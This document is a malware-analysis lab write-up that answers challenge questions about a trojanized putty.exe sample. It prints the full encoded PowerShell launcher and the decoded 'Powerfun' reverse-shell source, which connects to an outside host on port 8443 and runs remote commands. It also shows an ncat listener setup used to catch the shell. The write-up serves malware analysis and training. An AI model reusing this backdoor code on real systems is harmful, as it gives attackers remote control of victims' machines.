
# Challenge Answers

## Basic Static Analysis
---

Q: What is the SHA256 hash of the sample?

A: 0C82E654C09C8FD9FDF4899718EFA37670974C9EEC5A8FC18A167F93CEA6EE83 (HashTheFile)

---

Q: What architecture is this binary?

A:  PE32 (**P**ortable **E**xecutable - 32 bit) 
`file putty.exe`

---

Q: Are there any results from submitting the SHA256 hash to VirusTotal?

A: <br><img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231019204822.png" width=500px height=450px>
- Seems like a shellcode created via msfvenom, Metasploit is probably used as C2 here.
---

Q: Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?

A: Not really if you don't know what you're looking for. From the answers, I've got this, which could be possible to find if you'd know you are looking for powershell oneliner. Powershell added to magic words. :-)

```
$ [strings|floss] putty.exe | grep -i "powershell"
```

<br><img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231019225440.png">
- in this case, it didn't print out fully, but you get the idea.

---

Q: Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?

A: I looked up some of the functions and all can be used for legitimate use, as well as for evil one. There's `ShellExecuteA` for example, or `FindNextFileA` (can be used for enumeration,..)



## Basic Dynamic Analysis

---

Q: Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?

A: Upon executing the binary, we can, for a split of a second, see a blue window pop-up. That is a powershell.exe and it means it's executed in the background, we can find out what it does by using procmon.

---
Q: From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?

A: 
We can use procmon. We will firstly identify the PID of putty.exe, which, in our case, is 5984.
 - `Process name is putty.exe`
Then, we after getting our PID, we will use another filter to see which processes are using our putty.exe
- `Parent ID is 5984`
The first line tells us, there is a base64 encoded payload, like this : 

<img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231019221432.png">

- The full encoded code.
```powershell
powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
```

- We can decode it via REMnux, which gives us a gzip file, upon extracting, we get this reverse file :
```powershell
# Powerfun - Written by Ben Turner & Dave Hardy

function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]8443
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
    }
}

powerfun -Command reverse -Sslcon true
```
- https://isc.sans.edu/diary/PowerShell+Backdoor+Launched+from+a+ShellCode/26602
- This is a PowerShell backdoor, launched from a shellcode.
---

Q: What is the DNS record that is queried at detonation?

A: When we turn on wireshark (on remnux) and execute the `putty.exe`, we can see some TCP/DNS/HTTP requests.
<img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231021122205.png">
- About the DNS one, upon first execute of `putty.exe`, we can see this DNS request, which points to `bonus2.corporatebonusapplication.local`.
---

Q: What is the callback port number at detonation?

A: We can use `TCPView` for this task.
 - We gonna open TCPview and execute the putty.exe, then quickly pause it (View -> Pause)
 - We can see a powershell.exe process, the remote port is 8443 (left on the image)
 <img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231021122901.png">
 ---

Q: What is the callback protocol at detonation?

A: This can be seen again, in the `TCPView ` tool. The protocol is TCP, to be exact - TLSv1.2

---

Q: How can you use host-based telemetry to identify the DNS record, port, and protocol?

A: We can do that via `procmon`. and it's useful filters.<br>
<img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231021131827.png">
- Upon executing the binary, we get some powershell.exe processes :
<img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231021131909.png">
<br>
<img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231021131939.png">

---

Q: Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?

A: To try, we can change the hosts file, pointing `bonus2.corporatebonusapplication.local` to localhost/127.0.0.1, like this :
```shell
# cmder.exe
$ nano c:\Windows\System32\Drivers\etc\hosts
...
...

127.0.0.1 bonus2.corporatebonusapplication.local
```
- Now, we are going to listen for incoming connections to port 8443 via `ncat` :
`$ncat -lvnp 8443` and execute putty.exe, the response :

<img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231021133243.png">
- We've got something interesting, although it seems like it's not an interactive shell. Why?

The reverse shell is executed like this : `powerfun -Command reverse -Sslcon true`, here the `-Sslcon` flag wants us to use TLS(ssl), which via the ncat, we do not (by default) provide. We can provide it by using `--ssl` flag.

`$ncat --ssl -lvnp 8443`

<img src="https://raw.githubusercontent.com/nopnopnopnopnopnopnop/malware-notes/main/Pasted%20image%2020231021133705.png">
- As seen on the image, we get an interactive reverse shell.
